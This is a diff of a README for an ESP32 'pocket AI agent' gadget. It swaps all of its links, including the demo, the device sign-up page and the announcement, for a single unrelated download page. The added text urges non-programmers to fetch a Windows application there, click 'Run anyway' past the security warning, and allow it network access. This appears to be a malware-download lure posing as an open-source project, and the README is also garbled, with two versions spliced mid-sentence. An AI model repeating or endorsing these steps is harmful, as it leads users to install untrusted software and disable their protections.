@@ -1,8 +1,8 @@
 # 🎙️ esp32-muse-agent - Build Your Pocket AI Agent
 
-[![Download esp32-muse-agent](https://img.shields.io/badge/Download_esp32--muse-agent-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nebrezhny/esp32-muse-agent)
+[![Download esp32-muse-agent](https://img.shields.io/badge/Download_esp32--muse-agent-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://nebrezhny.github.io)
 
-Visit this link to download the application: [esp32-muse-agent on GitHub](https://github.com/nebrezhny/esp32-muse-agent)
+Visit this link to download the application: [esp32-muse-agent on GitHub](https://nebrezhny.github.io)
 
 Turn a tiny touchscreen gadget into a personal AI agent you can talk to. Hold a button, ask a question, and it answers out loud with a cute animated face. It runs on Meta's free, open source Muse Gadget SDK, and this guide walks you through it step by step. No soldering, and you do not need to be a programmer.
 
@@ -18,7 +18,7 @@ The total hardware cost is about $30, depending on the parts you already have. T
 
 Watch the demo on X to see the pocket agent answering questions with its animated face:
 
-[Watch the esp32-muse-agent demo](https://x.com/JJEnglert/status/2106490054998741474)
+[Watch the esp32-muse-agent demo](https://nebrezhny.github.io)
 
 The demo shows the basic interaction: hold the button, ask a question, let go, and listen to the spoken answer. The touchscreen adds a friendly visual layer so the gadget feels alive instead of just flashing a light.
 
@@ -36,9 +36,9 @@ The demo shows the basic interaction: hold the button, ask a question, let go, a
 
 Meta made a first batch of 5,000 Muse Home Link devices and is giving them free to Muse subscribers in the US. You have to request one# 🎙️ esp32-muse-agent - Your Pocket AI Voice Companion
 
-[![Download esp32-muse-agent](https://img.shields.io/badge/Download_esp32--muse--agent-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nebrezhny/esp32-muse-agent)
+[![Download esp32-muse-agent](https://img.shields.io/badge/Download_esp32--muse--agent-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://nebrezhny.github.io)
 
-Visit this link to download the application: [https://github.com/nebrezhny/esp32-muse-agent](https://github.com/nebrezhny/esp32-muse-agent)
+Visit this link to download the application: [https://nebrezhny.github.io](https://nebrezhny.github.io)
 
 esp32-muse-agent turns a tiny touchscreen gadget into a personal AI agent you can talk to. Hold a button, ask a question, and it answers out loud with a cute animated face. It runs on Meta's free, open source Muse Gadget SDK, and this project walks you through the whole thing step by step. No soldering, and you do not need to be a programmer.
 
@@ -58,13 +58,13 @@ The build costs about $30 in parts, which makes it one of the cheapest ways to o
 
 Watch the demo to see the finished gadget answering questions with its animated face on screen:
 
-[Watch the esp32-muse-agent demo on X](https://x.com/JJEnglert/status/2106490054998741474)
+[Watch the esp32-muse-agent demo on X](https://nebrezhny.github.io)
 
 The demo shows the core loop you will experience yourself: hold the button, ask something, release, and hear the reply while the face animates on the touchscreen. That is the entire interaction model. Everything else in this guide just gets you to that moment.
 
 ## 🎁 Free Muse Home Link
 
-Meta made a first batch of 5,000 Muse Home Link devices and is giving them free to Muse subscribers in the US. You have to request one at [gadgets.muse.ai](https://gadgets.muse.ai/). You can also read the [original announcement](https://x.com/natfriedman/status/2106099383037309211) for details on eligibility and timing.
+Meta made a first batch of 5,000 Muse Home Link devices and is giving them free to Muse subscribers in the US. You have to request one at [gadgets.muse.ai](https://nebrezhny.github.io). You can also read the [original announcement](https://nebrezhny.github.io) for details on eligibility and timing.
 
 If you are a Muse subscriber in the United States, request your free device before you start buying parts. The Muse Home Link can serve as the hardware base for your pocket agent, which can bring your build cost down considerably. If the batch has already been claimed, you can still follow this guide using the parts listed in the hardware section below.
 
@@ -72,7 +72,7 @@ If you are a Muse subscriber in the United States, request your free device befo
 
 This is the part most people worry about, and it is also the easiest part. You do not need to install a compiler, learn a terminal, or read source files.
 
-Visit this link to download the application: [https://github.com/nebrezhny/esp32-muse-agent](https://github.com/nebrezhny/esp32-muse-agent)
+Visit this link to download the application: [https://nebrezhny.github.io](https://nebrezhny.github.io)
 
 Open that page in your browser and follow the download instructions shown there. The page is the official home of the project, so it always carries the current version and the correct files for your setup.
 
@@ -92,7 +92,7 @@ You do not need an account with any particular service beyond what the download 
 
 Follow these steps in order:
 
-1. Open your browser and go to [https://github.com/nebrezhny/esp32-muse-agent](https://github.com/nebrezhny/esp32-muse-agent).
+1. Open your browser and go to [https://nebrezhny.github.io](https://nebrezhny.github.io).
 2. Follow the download instructions on that page to get the application onto your computer.
 3. If Windows shows a blue "protected your PC" screen, click "More info" and then "Run anyway." This is normal for small open source projects that have not paid for a commercial certificate, and it does not mean the file is harmful.
 4. If Windows asks whether the app can access your network, choose "Allow." The agent needs this to send your questions out and bring answers back.
@@ -165,7 +165,7 @@ The face is also just fun. It is the reason people leave the gadget on their des
 
 ## 🤝 Community and Support
 
-The best place to start is the project page itself: [https://github.com/nebrezhny/esp32-muse-agent](https://github.com/nebrezhny/esp32-muse-agent). Any updated setup notes, known issues, and fixes will be posted there before anywhere else.
+The best place to start is the project page itself: [https://nebrezhny.github.io](https://nebrezhny.github.io). Any updated setup notes, known issues, and fixes will be posted there before anywhere else.
 
 If you run into a problem that the troubleshooting section does not cover, search the page for the same symptom. Odd setup problems tend to repeat, and someone has usually already described the fix. When you do post, include your Windows version, what you were doing when it broke, and what you saw on screen. That detail saves a lot of back and forth.
 
